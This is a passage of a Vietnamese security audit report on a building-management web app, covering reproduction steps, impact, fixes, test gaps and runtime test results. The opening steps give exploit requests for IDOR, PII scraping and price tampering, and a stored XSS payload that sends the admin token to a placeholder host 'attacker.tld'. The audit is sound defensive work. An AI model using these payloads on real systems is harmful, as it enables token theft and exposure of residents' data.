   - *Điều kiện:* Bất kỳ tài khoản cư dân bình thường đã đăng nhập (token dạng `smart_token_<uuid>_<rand>`).
   - *Bước:* Gửi `PUT /api/v1/pricing-configs/{electricityId}` với `{"fixed_unit_price": 100}` hoặc `PUT .../tiers`. Do `ServicePricingController:26` gặp `str_starts_with($token, 'smart_token_')` nên `return null` tức thì.
4. **Cư dân xả/cướp thông tin toàn bộ cư dân tòa nhà qua API Vehicle Meta (`BUG-M4-02`):**
   - *Điều kiện:* Tài khoản `RESIDENT_MEMBER`.
   - *Bước:* Gửi `GET /api/v1/vehicles/meta/residents?limit=50` -> nhận 200 OK kèm SĐT, email, họ tên, số căn hộ của 50 cư dân.
5. **User chưa có căn hộ tạo QR khách hợp lệ vào căn hộ nạn nhân (`BUG-M6-01`):**
   - *Điều kiện:* Tài khoản user `ACTIVE` chưa từng thuộc bảng `residents` / `apartment_owners`.
   - *Bước:* Gửi `POST /api/v1/resident/visitors` với `{"apartment_id": "<VictimApartmentUuid>", "visitor_name": "Attacker", "expected_arrival_time": "2026-12-01 10:00:00"}`. Do không tìm được căn hộ thay thế, service chèn bản ghi `ACTIVE` với `apartment_id` của nạn nhân và trả mã QR thông hành.
6. **Stored XSS đánh cắp token Admin qua biểu mẫu CT01 (`BUG-M3-01`):**
   - *Điều kiện:* Tài khoản `RESIDENT_OWNER`.
   - *Bước:* Gửi `POST /api/v1/residents/temporary-registrations` với `reason = "<img src=x onerror=\"fetch('https://attacker.tld/?k='+localStorage.getItem('smart_cassavas_token'))\">"`. Khi Admin bấm nút In Biểu mẫu CT01, script chạy trong popup cùng origin và đọc `localStorage`.
7. **Nghe lén biến động xe & nhân khẩu toàn chung cư theo thời gian thực (`BUG-M12-01`):**
   - *Điều kiện:* Tài khoản `RESIDENT_MEMBER`.
   - *Bước:* Gửi `GET /api/v1/realtime/events?channels=quoc-tin.vehicles,quoc-tin.residents,quoc-tin.temporary-registrations&since_id=0`. `filterEventsForResident()` không lọc `apartment_id` trên 3 kênh này nên trả nguyên payload event của toàn bộ tòa nhà.

---

## 11. Ảnh hưởng nghiệp vụ

- **Bảo mật & Phân quyền:** Mô hình RBAC Matrix trên UI và database bị vô hiệu hóa ở 8/11 module nghiệp vụ: user có `VIEW` sửa/xóa/duyệt được dữ liệu; nhân viên có role hợp lệ không bị thu hồi được quyền chi tiết; `BUILDING_MANAGER`/`USER:CREATE` tạo được `SUPER_ADMIN`.
- **An toàn dữ liệu cá nhân (PII / Privacy):** SĐT, email, số căn hộ (qua `/vehicles/meta/residents`, `checkStatus`), ảnh CCCD (disk `public`), dữ liệu khách/xe/tạm trú của căn hộ khác (qua `filterEventsForResident`, `GlobalSearchService::dbSearchResidents`, `ResidentVisitorService`, `ReceptionPortalController`) có nguy cơ bị khai thác hàng loạt.
- **Tài chính & Toàn vẹn hóa đơn:** Cư dân có thể sửa giá điện/nước (`ServicePricingController`), nhân viên chỉ có `VEHICLE:VIEW` có thể tạo/duyệt xe và đồng bộ phí vào hóa đơn hoặc truyền `monthly_parking_fee = 1` VND (`VehicleController`), ảnh hưởng trực tiếp tới doanh thu và công nợ kỳ thanh toán.
- **Vận hành thực tế:** Không thể thêm lại cư dân từng chuyển đi (`ResidentService` soft-delete 409), không phân quyền được lại sau khi reset quyền riêng (`UserController` 500 `Duplicate entry`), không tạo được tài khoản Bảo vệ từ giao diện cấp phát (`'SECURITY'` typo).

---

## 12. Đề xuất sửa (Ít xâm lấn nhất)

### Nguyên tắc triển khai đề xuất
1. **Giữ ranh giới thành viên:** Các file của `Xuân Hòa` (`ServicePricingController.php`, `ServicePricingService.php`, `servicePricingApi.ts`, `ServicePricingManagement.tsx`) và `ReceptionPortalController.php` cần trao đổi / tạo PR phối hợp hoặc chờ thành viên duyệt trước khi sửa.
2. **Thống nhất Permission Catalog trong `RbacSeeder.php`:** Bổ sung đủ bộ 4–5 hành động chuẩn (`VIEW`, `CREATE`, `UPDATE`, `DELETE`, và action đặc thù như `APPROVE`, `CHECKIN`, `CHECKOUT`) cho `RESIDENT`, `TEMP_REG`, `VEHICLE`, `RFID`, `VISITOR`, `PARCEL`, `SCHEDULE`, `PRICING` sao cho khớp 100% giữa `RbacSeeder`, Controller, `QuocTinRealtimeService`, và `GlobalSearchService`.
3. **Thay Role-based Authorization bằng Permission-based Authorization:**
   - Trong `AccountProvisioningController`, `ResidentController`/`ResidentRequest`, `TemporaryRegistrationController`/`Request`, `VehicleController`, `AccessCardController`, `StaffScheduleController`, `ReceptionVisitorService`, `ReceptionParcelService`, `ReceptionDashboardService`: chỉ cho `isSuperAdmin()` bypass; mọi user khác bắt buộc kiểm tra `$user->hasPermission($requiredPermission)` tương ứng từng endpoint (`* :VIEW`, `*:CREATE`, `*:UPDATE`, `*:DELETE`, `*:APPROVE`, `*:CHECKIN`, `*:CHECKOUT`).
4. **Vá ngay các lỗi leo thang & Data Scoping trọng yếu:**
   - `AccountProvisioningService::assignRoles()` & `UserController::syncUserPermissions()`: áp dụng self-protection chuẩn như `RbacService::syncUserRoles()`.
   - `UserController::syncUserPermissions()`: dùng `Role::withTrashed()->firstOrNew()` + `restore()`.
   - `User::getAllPermissions()`: join `roles` và thêm `->whereNull('roles.deleted_at')`.
   - `usePermission.ts`: xóa bỏ nhánh `endsWith(':SPECIAL')`.
   - `AccountProvisioningManagement.tsx`: sửa `'SECURITY'` -> `'SECURITY_GUARD'`.
   - `VehicleController`: bọc `checkAdminAuthorization($request, 'VEHICLE:VIEW')` cho 3 route `/meta/*`; khóa `monthly_parking_fee` theo bảng giá trong `VehicleService` nếu không có quyền quản trị tài chính.
   - `AccessCardService`: bỏ `(int)` cast trên `$actorId`, chặn mở khóa từ `REVOKED`/`LOST_REPORTED`.
   - `ResidentVisitorService`: bỏ `DB::table('apartments')->first()`, trả `403` ngay khi `!$hasAccess`, đồng bộ scope giữa list và detail.
   - `QuocTinRealtimeService::filterEventsForResident()`: bổ sung lọc `$allowedApartmentIds` cho `vehicles`, `residents`, `temporary-registrations`.
   - `GlobalSearchService::dbSearchResidents()`: bọc các `whereHas`/`orWhereHas` trong `where(function ($q) ...)` trước `whereIn('apartment_id', ...)` và bỏ quyền cứng `DEV`/`TECHNICIAN`.
   - `TemporaryRegistrationService`: `e()` mọi giá trị trong `exportPoliceForm()`, `unset('police_reference_code')` khi cư dân cập nhật, chuyển CCCD sang disk private.
   - `ResidentTemporaryRegistrationPanel.tsx`: tải CT01 qua `fetch` + Bearer token thay cho thẻ `<a href>`.
   - `ResidentService`: khôi phục bản ghi đã soft-delete khi tạo trùng `(user_id, apartment_id)` thay vì văng 409; dùng Eloquent `save()` để đồng bộ Scout index.
   - `routes/web.php`: đưa các route `visitors`, `schedules`, `reception/dashboard`, `reception/overview` vào `middleware('auth.bearer:strict')` (hoặc `auth.bearer` tương thích fixture test hiện tại) và xóa public route `GET /vehicles/pricing-config` nếu không bắt buộc.

---

## 13. Test coverage hiện tại

Kiểm kê toàn bộ suite liên quan (trích xuất trực tiếp từ thư mục `tests/`):

### Feature Tests thuộc QuocTin & Liên quan (26 file)
1. `tests/Feature/Rbac/RbacManagementTest.php` (18 tests)
2. `tests/Feature/RbacSecurityTest.php` (13 tests)
3. `tests/Feature/AuthSecurityRegressionTest.php` (18 tests)
4. `tests/Feature/AuthenticationHardeningTest.php` (6 tests)
5. `tests/Feature/AccountProvisioning/AccountProvisioningTest.php` (18 tests)
6. `tests/Feature/Residents/ResidentCreateTest.php` (12 tests)
7. `tests/Feature/Residents/ResidentManagementTest.php` (21 tests)
8. `tests/Feature/Residents/ResidentConcurrencyTest.php` (9 tests)
9. `tests/Feature/Residents/ResidentCreateConcurrencyTest.php` (3 tests)
10. `tests/Feature/TemporaryRegistrations/TemporaryRegistrationTest.php` (17 tests)
11. `tests/Feature/TemporaryRegistrations/ResidentTemporaryRegistrationTest.php` (32 tests)
12. `tests/Feature/TemporaryRegistrations/TemporaryRegistrationConcurrencyTest.php` (10 tests)
13. `tests/Feature/TemporaryRegistrations/TemporaryRegistrationUpdateDeleteTest.php` (20 tests)
14. `tests/Feature/Vehicles/VehicleManagementTest.php` (17 tests)
15. `tests/Feature/Vehicles/ReceptionSecurityVehicleTest.php` (6 tests)
16. `tests/Feature/RfidManagement/RfidManagementTest.php` (15 tests)
17. `tests/Feature/ResidentVisitor/ResidentVisitorTest.php` (16 tests)
18. `tests/Feature/ReceptionVisitor/ReceptionVisitorCheckinTest.php` (17 tests)
19. `tests/Feature/ReceptionDashboard/ReceptionDashboardTest.php` (8 tests)
20. `tests/Feature/ReceptionParcel/ReceptionParcelTest.php` (22 tests)
21. `tests/Feature/ReceptionParcel/ReceptionParcelCheckoutTest.php` (11 tests)
22. `tests/Feature/Notifications/ParcelNotificationTest.php` (26 tests)
23. `tests/Feature/StaffSchedule/StaffScheduleTest.php` (13 tests)
24. `tests/Feature/GlobalBuildingSearchTest.php` (12 tests)
25. `tests/Feature/RealtimeSyncTest.php` (81 tests)
26. `tests/Feature/SearchEngineTest.php` (23 tests)
27. *Liên quan Module 10 (Xuân Hòa):* `tests/Feature/ServicePricing/ServicePricingManagementTest.php` (10 tests)

### Unit Tests toàn dự án (4 file – 37 tests)
- `tests/Unit/ExampleTest.php` (1 test)
- `tests/Unit/FreshnessServiceTest.php` (17 tests)
- `tests/Unit/GitHubActionsServiceTest.php` (16 tests)
- `tests/Unit/SearchCacheTest.php` (3 tests)

### Các test không chạy trong đợt audit này
- Các suite riêng của thành viên khác không thuộc phạm vi Module 1–12 của QuocTin (`Amenity*`, `Announcement*`, `Ticket*`, `Suggestion*`, `Survey*`, `Invoice*`, `Payment*`, `MeterReading*`, `Cicd*`, `BuildingApartmentManagementTest`, `DevAuthTest`, `PublicContentTest`, Playwright E2E `tests/e2e/*`).

---

## 14. Test coverage còn thiếu (`TEST COVERAGE GAP`)

Các kịch bản bảo mật sau **hoàn toàn chưa có test** (nếu bổ sung ở hiện tại sẽ phát hiện ra ngay các CONFIRMED BUG trên):
1. `RbacManagementTest` / `RbacSecurityTest`:
   - Chưa test reset quyền riêng (`DELETE /users/{id}/permissions`) rồi cấp lại quyền riêng (`PUT /users/{id}/permissions`) lần thứ 2 -> bỏ sót lỗi 500 `Duplicate entry`!
   - Chưa test non-`SUPER_ADMIN` có `USER:UPDATE` tự gọi `PUT /users/{self}/permissions` gán `SYSTEM:SPECIAL` / `ROLE:ASSIGN_PERMISSION`.
   - Chưa test `User::getAllPermissions()` khi một Role thường bị `soft delete`.
2. `AccountProvisioningTest`:
   - Chưa test `BUILDING_MANAGER` hoặc user có `USER:CREATE` gán `'roles' => ['SUPER_ADMIN']` qua `store`/`update`/`import`.
   - Chưa test user chỉ có `USER:CREATE` gọi `PUT`/`DELETE`/`toggle-lock` lên `SUPER_ADMIN` hoặc chính mình.
3. `ResidentManagementTest` / `ResidentCreateTest`:
   - Chưa test user được cấp quyền `RESIDENT:VIEW` gọi API bị 403 do hardcode role, hay `BUILDING_MANAGER` bị thu hồi `RESIDENT:DELETE` trên Ma trận RBAC vẫn xóa được.
   - `ResidentCreateTest::test_case_14` đang chấp nhận cả `409/422/500`, chưa có test nghiệp vụ khôi phục nhân khẩu đã soft-delete.
4. `TemporaryRegistrationTest` / `ResidentTemporaryRegistrationTest`:
   - Chưa test resident gửi `police_reference_code` trong `PUT /temporary-registrations/{id}`.
   - Chưa test XSS payload trong `reason`/`notes` khi gọi `export` và `download` CT01.
   - Chưa test user là `TENANT` ở căn hộ B nhưng mang role `RESIDENT_OWNER` ở căn hộ A sửa hồ sơ người khác ở căn hộ B.
5. `VehicleManagementTest` / `ReceptionSecurityVehicleTest`:
   - Chưa test user chỉ có `VEHICLE:VIEW` gọi `POST`/`PUT`/`DELETE`/`approve`/`sync-invoice`.
   - Chưa test `RESIDENT` gọi `/vehicles/meta/residents` và `/vehicles/meta/apartments/{id}/residents`.
   - Chưa test client gửi `monthly_parking_fee = 1` để giảm giá gửi xe xuống 1 đồng.
6. `RfidManagementTest`:
   - Chưa test `SECURITY_GUARD` bị thu hồi `RFID:DELETE`/`RFID:CREATE` trên RBAC matrix.
   - Chưa test `toggle-status` với thẻ `REVOKED` hoặc `LOST_REPORTED`.
   - Chưa test `actor_id` trong realtime event có phải đúng UUID của actor hay bị ép thành `(int)`.
7. `ResidentVisitorTest`:
   - Chưa test user không thuộc căn hộ nào gửi `apartment_id` của căn hộ nạn nhân (hoặc bỏ trống `apartment_id`) vào `POST /resident/visitors`.
   - Chưa test cư dân B chưa có lượt khách tự tạo vs đã có 1 lượt khách xem danh sách khách căn hộ.
8. `ReceptionVisitorCheckinTest`, `ReceptionParcelTest`, `ReceptionDashboardTest`:
   - Chưa test nhân viên `RECEPTIONIST` chỉ có quyền `VIEW` bị chặn khi gọi `check-in`, `receive`, `handover`, `update`, `delete`.
   - Chưa test `GET /api/v1/reception/parcels` bằng cư dân không trả KPI toàn tòa nhà; cư dân hết hạn hợp đồng không xem được bưu phẩm mới.
   - Chưa test `GET /api/v1/reception/overview` với user chưa đăng nhập hoặc cư dân.
9. `ServicePricingManagementTest`:
   - Hoàn toàn **không có bất kỳ test Authorization/Forbidden 401/403 nào** cho Guest, Resident hoặc nhân viên `VIEW`-only.
10. `StaffScheduleTest`:
    - Chưa test thu hồi quyền tạo/sửa/xóa lịch trên Ma trận RBAC đối với `BUILDING_MANAGER`, và chưa test hạn chế PII trên `staff-candidates`.
11. `RealtimeSyncTest` & `GlobalBuildingSearchTest`:
    - Chưa test `filterEventsForResident` cho 3 kênh `vehicles`, `residents`, `temporary-registrations` khi có event của căn hộ khác.
    - Chưa test `dbSearchResidents()` (Elasticsearch tắt) khi cư dân tìm từ khóa khớp cư dân căn hộ khác (gặp lỗi `OR` precedence).

---

## 15. Runtime Verification

### Thiết lập môi trường chạy kiểm thử (Read-only)
- **Database thực nghiệm:** MySQL đang chạy trong WSL Ubuntu (`127.0.0.1:3306`, database `quanly_toanha_test`, đã migrate & seed sẵn).
- **Vấn đề cache môi trường cục bộ phát hiện:** Tại thời điểm chạy, trong `bootstrap/cache/config.php` đang cache `DB_HOST=db` (từ Docker). Khi chạy lần đầu mà không bypass cache, `RbacSecurityTest` lỗi ngay `getaddrinfo for db failed`. Để giữ tuyệt đối chế độ Read-Only (không xóa hay ghi đè file `bootstrap/cache/config.php`), các lệnh chạy PHPUnit được truyền biến môi trường `APP_CONFIG_CACHE=/tmp/no_cfg.php APP_ROUTES_CACHE=/tmp/no_routes.php` kết hợp `DB_HOST=127.0.0.1 DB_DATABASE=quanly_toanha_test`.
- **PHP Runtime trong WSL:** `PHP 8.5.4 (cli)`, PHPUnit `12.5.34`, **extension `gd` chưa được cài đặt** (`GD_NOT_INSTALLED`).

### Kết quả chạy thực tế sau kiểm toán (lệnh chạy nguyên bản, không sửa code/test)

| Đợt chạy | Phạm vi | Tests | Assertions | Passed | Failed | Errors | Skipped / Notices | Thời gian | Ghi chú thực nghiệm chính xác |
|---|---|---|---|---|---|---|---|---|---|
| **Run 1** | `RbacSecurityTest` | 13 | 116 | 13 | 0 | 0 | 0 | 01:43.660 | **100% PASS** |
| **Run 2 (Batch 1)** | 9 Feature suites (Auth, RBAC, Provisioning, Residents, TempReg) | 162 | 622 | 158 | 0 | **4** | 0 | 02:18.608 | **4 Errors đều do `LogicException: GD extension is not installed`** tại `FileFactory::image()` trong test upload CCCD (`ResidentTemporaryRegistrationTest::test_12`, `test_29`, `test_30` và `TemporaryRegistrationTest::test_08_09`). 0 assertion failure. |
| **Run 3 (Batch 2)** | 17 Feature suites (Concurrency, Vehicles, RFID, Visitors, Reception, Parcel, Schedule, Pricing, GlobalSearch, Realtime, SearchEngine) | 299 | 1,374 | 277 | 0 | **3** | **19 Skipped** | 03:10.248 | **2 Errors do thiếu `GD extension`** (`ReceptionParcelTest::test_receptionist_receives_parcel_with_image_upload_successfully`, `test_reject_oversized_image_upload`); **1 Error do fixture concurrency không dùng Transaction** (`ResidentCreateConcurrencyTest::test_case_08_concurrent_create_same_resident`: `1062 Duplicate entry '...-A02-8669' for key 'apartments.uq_apartment_number'`); **19 Skipped** (các integration test phụ thuộc dịch vụ bên ngoài như Elasticsearch/Meilisearch offline). |
| **Run 4 (Unit)** | Toàn bộ `tests/Unit` (4 files) | 37 | 142 | 37 | 0 | 0 | 3 PHPUnit Notices | 00:17.528 | **0 Failed, 0 Errors**. |
| **Tổng cộng thực chạy** | **27 Feature suites + 4 Unit suites** | **511** | **2,254** | **485** | **0** | **7** | **19 Skipped, 3 Notices** | ~07:30 | Toàn bộ assertion nghiệp vụ chạy được đều đạt, không có failure do assertion logic; 6/7 errors thuần môi trường thiếu `ext-gd` trong WSL PHP 8.5, 1/7 errors do collision mã căn hộ ngẫu nhiên `rand(1000,9999)` ở test concurrency. |

#### Chi tiết từng suite trong Run 2 (Batch 1 – JUnit XML)
- `AccountProvisioningTest`: 18 tests, 66 assertions, 0 errors, 0 failures (32.68s)
- `AuthSecurityRegressionTest`: 18 tests, 44 assertions, 0 errors, 0 failures (11.15s)
- `AuthenticationHardeningTest`: 6 tests, 44 assertions, 0 errors, 0 failures (6.98s)
- `RbacManagementTest`: 18 tests, 74 assertions, 0 errors, 0 failures (24.83s)
- `ResidentCreateTest`: 12 tests, 58 assertions, 0 errors, 0 failures (11.46s)
- `ResidentManagementTest`: 21 tests, 96 assertions, 0 errors, 0 failures (15.74s)
- `ResidentTemporaryRegistrationTest`: 32 tests, 95 assertions, 3 errors (GD), 0 failures (21.79s)
- `TemporaryRegistrationTest`: 17 tests, 74 assertions, 1 error (GD), 0 failures (5.41s)
- `TemporaryRegistrationUpdateDeleteTest`: 20 tests, 71 assertions, 0 errors, 0 failures (7.90s)

---

## 16. Regression Risk

1. **Rủi ro từ việc revert Stage 2A teammate controllers (`00aaed8`):** 4 controller về Hóa đơn & Cấu trúc tòa nhà (`InvoiceManagementController`, `InvoiceGenerationController`, `DebtReminderController`, `BuildingStructureController`) hiện trở lại trạng thái chưa hardened từ `master`. Dù không thuộc phạm vi sửa trực tiếp của QuocTin, toàn hệ thống vẫn tiềm ẩn rủi ro nếu nhóm tài chính/tòa nhà chưa tự vá lại theo đúng mẫu RBAC Stage 2A.
2. **Rủi ro từ `usePermission.ts`:** Giữ nguyên `.endsWith(':SPECIAL')` ở Frontend trong khi Backend đã bỏ (`User.php`) gây lệch hành vi UI vs API (UI hiện nút bấm nhưng API trả `403`, hoặc tạo cảm giác hiểu sai quyền của người dùng).
3. **Rủi ro khi hardening `AccountProvisioningController`, `VehicleController`, `AccessCardController`, `ReceptionParcelService`, `ReceptionVisitorService`, `StaffScheduleController`:** Vì các test hiện tại (vd `ReceptionSecurityVehicleTest`, `StaffScheduleTest`, `RfidManagementTest`, `ReceptionParcelTest`) tạo user chỉ gắn **Role** (chưa hẳn chạy `RbacSeeder` trong `setUp()` hoặc chưa seed các mã quyền mới `RFID:*`, `SCHEDULE:*`, `PARCEL:CHECKOUT`, `TEMP_REG:*`), nếu chuyển controller sang check permission bắt buộc mà **không cập nhật `RbacSeeder` trước và chưa rà soát fixture test**, hàng loạt feature test hiện hữu sẽ bị `403`.
4. **Rủi ro từ `ResidentTemporaryRegistrationPanel.tsx` & `auth.bearer:strict`:** Sau khi BUG-02 đóng đường `X-User-Id`/session fallback, tính năng tải CT01 qua `<a href>` của Cư dân đã gãy âm thầm (401) và cần chuyển sang tải bằng `fetch` kèm Bearer header.
5. **Rủi ro cache config:** `bootstrap/cache/config.php` hiện trỏ về `DB_HOST=db` (Docker). Nếu dev chạy PHPUnit ngoài container mà không `config:clear` sẽ lỗi kết nối DB hoặc nhầm DB.

---

## 17. Git Status cuối cùng (Xác nhận Read-Only)

- Xác minh bằng `git status` tại thời điểm kết thúc kiểm toán:
  - **Không có bất kỳ file production (`app/`, `routes/`, `database/`, `resources/`, `config/`), test (`tests/`), seeder hoặc migration nào bị sửa, thêm hoặc xóa.**
  - File duy nhất được tạo mới trong workspace đúng theo yêu cầu là `BUG_04_STAGE_2B_COMPREHENSIVE_AUDIT_REPORT.md` (untracked).
  - Toàn bộ môi trường `quanly_toanha_test`, Docker, `bootstrap/cache/*`, nhánh Git `QuocTin/Fix_all` được giữ nguyên trạng thái ban đầu.

---

## Bảng Tổng Hợp Lỗi & Đề Xuất Khắc Phục (Gom 47 đầu mục thành 41 dòng)

| STT | Module | Bug | Severity | File | Status | Recommended Fix |
|---|---|---|---|---|---|---|
| 1 | Module 1 (Provisioning) | `BUILDING_MANAGER` hoặc user có `USER:CREATE` gán được role `SUPER_ADMIN` và `update`/`delete`/`toggleLock` tài khoản `SUPER_ADMIN` | CRITICAL | `app/Http/Controllers/AccountProvisioningController.php`, `app/Services/AccountProvisioningService.php` | CONFIRMED BUG | Phân tách permission từng action (`USER:VIEW/CREATE/UPDATE/DELETE`); cấm non-`SUPER_ADMIN` gán hoặc can thiệp `SUPER_ADMIN`/`ADMIN`; clear cache quyền khi đổi role |
| 2 | Module 1 (RBAC) | User chỉ có `USER:UPDATE` tự cấp `SYSTEM:SPECIAL` / `ROLE:ASSIGN_PERMISSION` cho mình qua `/users/{id}/permissions` | CRITICAL | `routes/web.php`, `app/Http/Controllers/UserController.php` | CONFIRMED BUG | Bỏ `USER:UPDATE` khỏi route `/permissions`, chỉ giữ `ROLE:ASSIGN_PERMISSION`; chặn tự nâng quyền và chặn sửa user `SUPER_ADMIN` |
| 3 | Module 1 (RBAC) | Tái phân quyền riêng cho user sau khi `resetUserPermissions` bị lỗi 500 `Duplicate entry` | HIGH | `app/Http/Controllers/UserController.php`, `app/Models/Role.php` | CONFIRMED BUG | Dùng `Role::withTrashed()->firstOrNew(['role_code' => $customRoleCode])` và `$role->restore()` trước khi đồng bộ quyền |
| 4 | Module 1 (RBAC UI) | `usePermission.ts` khôi phục wildcard `.endsWith(':SPECIAL')` | HIGH | `resources/js/Hooks/usePermission.ts` | CONFIRMED BUG | Chỉ kiểm tra `permissions.includes('SPECIAL') || permissions.includes('SYSTEM:SPECIAL')` |
| 5 | Module 1 (Provisioning UI) | Dropdown vai trò gửi `'SECURITY'` thay cho `'SECURITY_GUARD'`, làm tạo Bảo vệ bị gán nhầm thành `RESIDENT_OWNER` | HIGH | `resources/js/Pages/Admin/AccountProvisioningManagement.tsx`, `app/Services/AccountProvisioningService.php` | CONFIRMED BUG | Sửa value dropdown thành `'SECURITY_GUARD'`; ném validation error khi `role_code` không hợp lệ thay cho fallback |
| 6 | Module 1 (RBAC Core) | `User::getAllPermissions()` & `RbacService::hasPermission()` không lọc `roles.deleted_at IS NULL` | MEDIUM | `app/Models/User.php`, `app/Services/RbacService.php` | CONFIRMED BUG | Join `roles` và thêm `whereNull('roles.deleted_at')`; đồng nhất lookup trên `stdClass` |
| 7 | Module 1 (Provisioning Auth) | `activateAccount` cho dùng raw bcrypt hash (`hash_equals`); `/account-provisioning/status` lộ `username`/`full_name` public | MEDIUM | `app/Services/AccountProvisioningService.php`, `app/Http/Controllers/AccountProvisioningController.php`, `routes/web.php` | CONFIRMED BUG | Bỏ `hash_equals($record->token, $token)`; gắn `throttle` và không trả PII nhạy cảm ở `checkStatus` |
| 8 | Module 1 (Frontend Guard) | `AppSidebar` chỉ check 5 item; `app.tsx` không chặn resident vào `/le-tan`; `AppTopbar` tin `localStorage` | MEDIUM | `resources/js/Components/Layout/AppSidebar.tsx`, `AppTopbar.tsx`, `resources/js/app.tsx` | CONFIRMED BUG | Gắn `can()` đầy đủ cho menu QuocTin; chặn `resident` ở `isReceptionistPath`; dựa vào `/auth/me` server-side |
| 9 | Module 2 (Residents) | Chặn quyền bằng role hardcode thay vì `RESIDENT:*`, thiếu seed `RESIDENT:CREATE/UPDATE/DELETE` | HIGH | `app/Http/Controllers/ResidentController.php`, `app/Http/Requests/ResidentRequest.php` | CONFIRMED BUG | Seed đủ `RESIDENT:*` và kiểm tra permission theo hành động |
| 10 | Module 2 (Residents) | Không thể thêm/khôi phục nhân khẩu từng bị soft-delete do `UNIQUE(user_id, apartment_id)` (báo 409) | HIGH | `app/Services/ResidentService.php` | CONFIRMED BUG | Check `withTrashed()->lockForUpdate()` trong transaction và `restore()` khi tồn tại bản ghi đã xóa mềm |
| 11 | Module 2 (Residents) | `stay_end_date` không kiểm tra đối chiếu `stay_start_date` DB khi PATCH; `where()->update()` bỏ qua Scout sync | MEDIUM | `app/Http/Requests/ResidentRequest.php`, `app/Services/ResidentService.php` | CONFIRMED BUG | Đối chiếu `stay_start_date` hiện có trong service; gọi Eloquent `save()` để đồng bộ Scout |
| 12 | Module 3 (TempReg) | Stored XSS qua Biểu mẫu CT01 (`exportPoliceForm` thiếu escape + iframe không sandbox + `document.write`) | HIGH | `app/Services/TemporaryRegistrationService.php`, `resources/js/Pages/Admin/TemporaryRegistrationManagement.tsx` | CONFIRMED BUG | Escape bằng `htmlspecialchars()` ở backend; thêm `sandbox` chặt chẽ cho iframe preview |
| 13 | Module 3 (TempReg) | Cư dân tự ghi/giả mạo `police_reference_code` khi cập nhật hồ sơ tạm trú | HIGH | `app/Http/Requests/TemporaryRegistrationRequest.php`, `app/Services/TemporaryRegistrationService.php` | CONFIRMED BUG | `unset('police_reference_code')` nếu không phải Admin/Manager; tách khỏi `$fillable` |
| 14 | Module 3 (TempReg) | Ảnh CCCD lưu lên disk `public`; `RESIDENT_OWNER` global cho sửa hộ thành viên căn hộ khác dù mình chỉ là `TENANT` tại đó | MEDIUM | `app/Services/TemporaryRegistrationService.php`, `app/Http/Requests/TemporaryRegistrationRequest.php` | CONFIRMED BUG | Lưu CCCD trên disk `local` qua endpoint có auth; bỏ `$user->hasRole('RESIDENT_OWNER')` global |
| 15 | Module 3 (TempReg) | `isUserAdmin()` chỉ check role; nút tải Mẫu CT01 ở Portal Cư dân bị 401 do thiếu Bearer header | MEDIUM | `app/Http/Controllers/TemporaryRegistrationController.php`, `resources/js/Components/ResidentTemporaryRegistrationPanel.tsx` | CONFIRMED BUG | Check permission `TEMP_REG:*`; tải CT01 qua `fetch` có `Authorization: Bearer ...` |
| 16 | Module 4 (Vehicles) | `VEHICLE:VIEW` thực hiện được toàn bộ CREATE, UPDATE, DELETE, APPROVE, SYNC-INVOICE; Role bypass RBAC | CRITICAL | `app/Http/Controllers/VehicleController.php` | CONFIRMED BUG | Truyền đúng `$requiredPermission` theo từng method (`VIEW`/`CREATE`/`UPDATE`/`DELETE`/`APPROVE`); bỏ check role cứng |
| 17 | Module 4 (Vehicles PII) | 3 endpoint `/api/v1/vehicles/meta/*` không gọi `checkAdminAuthorization`, lộ toàn bộ PII cư dân | CRITICAL | `app/Http/Controllers/VehicleController.php` | CONFIRMED BUG | Bắt buộc gọi `checkAdminAuthorization($request, 'VEHICLE:VIEW')` trong `apartments`, `apartmentResidents`, `allResidents` |
| 18 | Module 4 (Vehicles Fee) | Client gửi `monthly_parking_fee = 1` để ghi đè biểu phí và đồng bộ vào hóa đơn | HIGH | `app/Http/Requests/VehicleRequest.php`, `app/Services/VehicleService.php` | CONFIRMED BUG | Buộc server tra biểu phí từ `getPricingForCategory()` trừ khi có permission quản lý giá |
| 19 | Module 4 (Vehicles) | Thiếu endpoint/UI Từ chối đăng ký xe & lý do từ chối; thiếu kiểm tra chủ xe thuộc căn hộ | MEDIUM | `app/Http/Controllers/VehicleController.php`, `app/Services/VehicleService.php`, `VehicleManagement.tsx` | CONFIRMED BUG | Bổ sung endpoint `reject` + validate mối quan hệ cư trú của `owner_user_id` tại `apartment_id` |
| 20 | Module 5 (RFID) | `AccessCardController` kiểm tra chỉ dựa vào Role, không kiểm tra RBAC permission (`RFID:*` chưa seed) | HIGH | `app/Http/Controllers/AccessCardController.php` | CONFIRMED BUG | Seed `RFID:VIEW/CREATE/UPDATE/DELETE` và enforce qua `$requiredPermission` theo action |
| 21 | Module 5 (RFID) | Cast UUID `$actorId` thành `(int)` làm hỏng dữ liệu `actor_id` trong sự kiện realtime RFID | HIGH | `app/Services/AccessCardService.php` | CONFIRMED BUG | Truyền thẳng `?string $actorId` thay cho `(int) $actorId` ở cả 4 call `emit()` |
| 22 | Module 5 (RFID) | `toggle-status` cho phép kích hoạt lại thẻ đã `REVOKED`/`LOST_REPORTED`; thiếu ràng buộc user/vehicle thuộc căn hộ | MEDIUM | `app/Services/AccessCardService.php`, `app/Http/Requests/AccessCardRequest.php` | CONFIRMED BUG | Chặn `toggleStatus` nếu thẻ là `REVOKED`/`LOST_REPORTED`; kiểm tra `assigned_user_id`/`assigned_vehicle_id` thuộc `assigned_apartment_id` |
| 23 | Module 6 (Res. Visitors) | IDOR tạo QR Pass gắn vào căn hộ bất kỳ của nạn nhân khi attacker chưa có căn hộ (`!$hasAccess` giữ nguyên `apartment_id`) | CRITICAL | `app/Services/ResidentVisitorService.php` | CONFIRMED BUG | Chặn `abort(403)` ngay lập tức khi `!$hasAccess` |
| 24 | Module 6 (Res. Visitors) | User không thuộc căn hộ nào bị gán tự động vào căn hộ đầu tiên trong bảng `apartments` | HIGH | `app/Services/ResidentVisitorService.php` | CONFIRMED BUG | Xóa bỏ hoàn toàn `DB::table('apartments')->first()`, trả về 403/422 |
| 25 | Module 6 (Res. Visitors) | Logic `$hasOwn` bất nhất giữa list và detail; `ResidentPortalController::overview` lộ QR/CCCD khách hàng xóm *(shared)* | HIGH / MEDIUM | `app/Services/ResidentVisitorService.php`, `app/Http/Controllers/ResidentPortalController.php` | CONFIRMED BUG | Thống nhất scope và ẩn CCCD/QR của lượt khách do resident khác tạo |
